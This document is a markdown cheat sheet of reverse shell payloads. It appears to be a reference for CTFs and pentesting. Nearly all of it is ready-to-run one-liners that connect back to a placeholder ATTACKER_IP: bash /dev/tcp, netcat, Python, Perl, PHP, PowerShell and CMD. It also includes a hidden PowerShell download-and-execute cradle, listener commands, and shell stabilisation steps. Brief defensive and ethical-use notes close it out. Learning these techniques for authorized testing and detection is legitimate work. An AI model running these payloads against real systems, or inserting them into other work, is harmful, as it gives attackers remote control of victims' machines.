# 🔁 Reverse Shells

> Reverse shells are used to get a command shell back to an attacker-controlled machine. They are most commonly used in CTFs, labs, and authorized security testing.

## Quick mental model

- Bind shell: target listens, attacker connects
- Reverse shell: target connects back to attacker
- Most common in real-world exploitation: target initiates outbound connection

---

## 1) Bash reverse shell

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

```bash
nc -e /bin/sh ATTACKER_IP 4444
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

---

## 2) Python reverse shell

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
python -c "import os,socket,subprocess; s=socket.socket(); s.connect(('ATTACKER_IP',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])"
```

---

## 3) Perl reverse shell

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN, ">&S");open(STDOUT, ">&S");open(STDERR, ">&S");exec("/bin/sh -i");'
```

---

## 4) PHP reverse shell

```bash
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
?>
```

---

## 5) Netcat reverse shell

Listener:

```bash
nc -lvnp 4444
```

Target:

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

Alternative stable version:

```bash
rm -f /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/p
```

---

## 6) PowerShell reverse shell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
```

Direct reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -gt 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() };
```

---

## 7) Windows CMD reverse shell

```cmd
cmd /c "powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -gt 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}""
```

---

## 8) Listener setup

```bash
nc -lvnp 4444
```

```bash
rlwrap -cAr nc -lvnp 4444
```

```bash
socat -d -d TCP-L:4444 -
```

---

## 9) Tips

- Use `bash -i` or `sh -i` when available
- Prefer `socat` or `nc` in labs if available
- On Linux, shell is often easier with `python3` or `bash`
- On Windows, `powershell` is usually the path of least resistance

---

## 10) Defensive considerations

- Monitor outbound connections to unusual ports
- Detect `nc`, `bash -i`, `python -c`, and `powershell` execution
- Restrict egress rules and outbound traffic
- Review suspicious process creation and network activity

---

## 11) Ethical use

Use this only in:

- your own lab
- authorized pentests
- CTF environments
- approved security engagements

Do not use against systems you do not own or do not have permission to test.

---

## Typical workflow

1. Start a listener on attacker box
2. Run reverse shell payload on target
3. Stabilize shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`
4. Escalate or pivot if needed
5. Clean up if applicable

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Common one-liners

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
nc ATTACKER_IP 4444 -e /bin/bash
python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("ATTACKER_IP",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/bash","-i"])'
```

